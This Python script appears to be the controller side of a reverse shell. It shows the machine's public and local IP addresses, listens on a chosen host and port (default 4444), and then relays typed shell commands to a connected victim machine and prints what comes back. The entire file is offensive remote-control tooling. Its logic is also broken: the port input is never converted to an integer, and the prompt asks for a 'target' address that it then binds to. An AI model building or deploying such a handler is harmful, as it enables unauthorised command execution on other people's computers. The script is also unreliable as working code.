import socket
from requests import get

def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1, [*] NOT CONNECTED TO A NETWORK!!'
    finally:
        s.close()
    return IP
def get_external_ip():
    try:
        ip = get('https://api.ipify.org').text
    except:
        ip = "127.0.0.1, [*] NOT CONNECTED TO A NETWORK!!"
    return ip
def mainServer(host,port):
    bufferSize = 1024 #buffer size is 1024 bit, if u want you can increase it. 
    s = socket.socket()
    s.bind((host,port))
    s.listen(5) #I am setting it to listen for max. 5 connections, if u want you can increase it.
    print(f"Listening as {host}:{port} ...") 
    clientSocket, clientAddress = s.accept()
    print(f"{clientAddress[0]}:{clientAddress[1]} Connected!")
    print("To exit the connection, Enter 'exit'")
    while True:
        instruction = input(f"[*] Shell ~ {clientAddress[0]} ~ Enter Command - ")
        clientSocket.send(instruction.encode())
        if instruction.lower() == "exit":
            break
        result = clientSocket.recv(bufferSize).decode()
        print(result)
    clientSocket.close()
    s.close()
print("Your Current Public/External IP address is:",get_external_ip())
print("Your Current LOCAL IP address is:",get_internal_ip())
print("")
while True:
    try:
        print(server_host)
        print(server_port)
        print("")
        break
    except:
        print("[*!*] Enter Valid Local/Public IP address, Otherwise Program won't Work")
        server_host = str(input("Enter Target's IP address [Eg = 192.168.x.x]: "))
        server_port = 4444
        server_port = input("Enter Port Number[default = 4444]: ")
        try:
            int(server_port)
        except:
            server_port = 4444
mainServer(server_host,server_port)








